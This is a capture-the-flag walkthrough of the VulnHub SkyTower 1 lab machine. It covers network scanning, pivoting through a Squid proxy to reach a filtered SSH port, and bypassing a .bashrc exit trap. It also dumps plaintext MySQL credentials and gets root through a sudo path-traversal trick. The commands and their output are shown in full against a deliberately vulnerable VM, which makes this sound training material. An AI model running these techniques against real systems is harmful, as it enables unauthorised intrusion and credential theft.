title: VulnHub - SkyTower 1 
---

**Description:** You will require skills across different facets of system and application vulnerabilities, as well as an understanding of various services and how to attack them. Most of all, your logical thinking and methodical approach to penetration testing will come into play to allow you to successfully attack this system.

**Author:** Telspace

**Operating System:** Linux

**Aim:** To get root shell.

## Information Gathering
### Host Discovery

A ping sweep on the local network discovered the target machine, the script you can download it [here](https://github.com/s4rgaz/hdiscovery.git).

```bash
root@kali:~$ hdiscovery.py -r 192.168.179.0/24
192.168.179.175 => up
```

### Port Scanning

A full TCP port scan with nmap discovered two open ports and one that is filtered.

```bash
root@kali:~$ nmap -n -v -p- -T4 192.168.179.175 -oG nmap/all-tcp-ports.txt
...
PORT     STATE    SERVICE
22/tcp   filtered ssh
80/tcp   open     http
3128/tcp open     squid-http
...
```

### Service Enumeration

An aggressive scan with nmap discovered more information about the open ports.

```bash
root@kali:~$ nmap -A -n -v -p80,3128 192.168.179.175 -oN nmap/service-enum.txt
...
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.2.22 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.22 (Debian)
|_http-title: Site doesn't have a title (text/html).
3128/tcp open  http-proxy Squid http proxy 3.1.20
|_http-server-header: squid/3.1.20
|_http-title: ERROR: The requested URL could not be retrieved
...
```

### Web Enumeration

The web application contains a login form, by adding a single quote in the user field it was possible to detect that MySQL is running.

After of try various manual tests for a possible login bypass, I found the following SQL statement that worked.

We can see the credentials to access via SSH.

### Squid Enumeration

Squid is a caching proxy for the Web supporting HTTP, HTTPS, FTP, and more. It reduces bandwidth and improves response times by caching and reusing frequently-requested web pages.

We can also use it to enumerate services that are running locally on the server or that we can't access.

If we remember the SSH service on port 22 is filtered, to be able to access through the proxy we need to add **http 192.168.179.175 3128** at the end of the file **/etc/proxychains4.conf**.

As we are going to be using proxychains it is necessary to start the TOR service, the following scan with nmap through proxychains reveals that the SSH service is open.

```bash
root@kali:~$ systemctl start tor

root@kali:~$ proxychains nmap -sT -Pn -n -p22 192.168.179.175 
...
PORT   STATE SERVICE
22/tcp open  ssh
```

## Exploitation
### Access via SSH

Now we can login via SSH using the proxy.

```bash
root@kali:~$ proxychains ssh john@192.168.179.175
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Dynamic chain  ...  192.168.179.175:3128  ...  192.168.179.175:22  ...  OK
john@192.168.179.175's password:

Connection to 192.168.179.175 closed.
```

The connection is established but we don't get a shell, we can bypass this simply adding **/bin/bash** as follows.

```bash
root@kali:~$ proxychains ssh john@192.168.179.175 /bin/bash
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Dynamic chain  ...  192.168.179.175:3128  ...  192.168.179.175:22  ...  OK
john@192.168.179.175's password:
id
uid=1000(john) gid=1000(john) groups=1000(john)
```

Now we can execute system commands, in the **/var/www** directory there is a file named login.php that contains the credentials to log into MySQL.

```bash
pwd
/var/www
head -n 8 login.php
<?php

$db = new mysqli('localhost', 'root', 'root', 'SkyTech');

if($db->connect_errno > 0){
    die('Unable to connect to database [' . $db->connect_error . ']');

}
```

The following one-line instruction lists the available databases.

```bash
mysql -u root -proot -e "show databases"
Database
information_schema
SkyTech
mysql
performance_schema
```

Enumerating the SkyTech database tables.

```bash
mysql -u root -proot -e "use SkyTech; show tables"
Tables_in_SkyTech
login
```

Retrieving the records from the table login.

```bash
mysql -u root -proot -e "use SkyTech; select * from login"
id      email   password
1       john@skytech.com        hereisjohn
2       sara@skytech.com        ihatethisjob
3       william@skytech.com     senseable
```

We have the password for the users in plain text, so we login via SSH as user sara.

```bash
root@kali:~$ proxychains ssh sara@192.168.179.175 /bin/bash           
[proxychains] config file found: /etc/proxychains4.conf                       
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4          
[proxychains] DLL init: proxychains-ng 4.14                                     
[proxychains] Dynamic chain  ...  192.168.179.175:3128  ...  192.168.179.175:22  ...  OK
sara@192.168.179.175's password:                                
id                                                             
uid=1001(sara) gid=1001(sara) groups=1001(sara)
```

As we see we don't have an interactive shell, that's annoying, if we check the last three lines of the .bashrc file, that's what interrupts that we can access the system and have a shell. 

```bash
tail -n 3 .bashrc
echo
echo  "Funds have been withdrawn"
exit
```

We can remove the last three lines from the .bashrc file and get a TTY shell, as follows:

```bash
mv .bashrc bashrc   
sed -n '1,111p' bashrc > .bashrc
script -qc /bin/bash /dev/null
sara@SkyTower:~$ id  
uid=1001(sara) gid=1001(sara) groups=1001(sara)
```

The user sara is allowed to execute the cat and ls commands as sudo in the directory /accounts/, we will take advantage of this to get root.

```bash
sara@SkyTower:~$ sudo -l
Matching Defaults entries for sara on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sara may run the following commands on this host:
    (root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*
```

Using sudo we can list the /root directory and read the flag that contains the password for the user root.

```bash
sara@SkyTower:~$ sudo /bin/ls /accounts/../root
flag.txt
sara@SkyTower:~$ sudo /bin/cat /accounts/../root/flag.txt
Congratz, have a cold one to celebrate!
root password is theskytower
```

Finally we login via SSH as user root.

```bash
root@kali:~$ proxychains ssh root@192.168.179.175 '/bin/bash -i'
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Dynamic chain  ...  192.168.179.175:3128  ...  192.168.179.175:22  ...  OK
root@192.168.179.175's password: 
bash: cannot set terminal process group (-1): Invalid argument
bash: no job control in this shell
root@SkyTower:~# id
id
uid=0(root) gid=0(root) groups=0(root)  
```
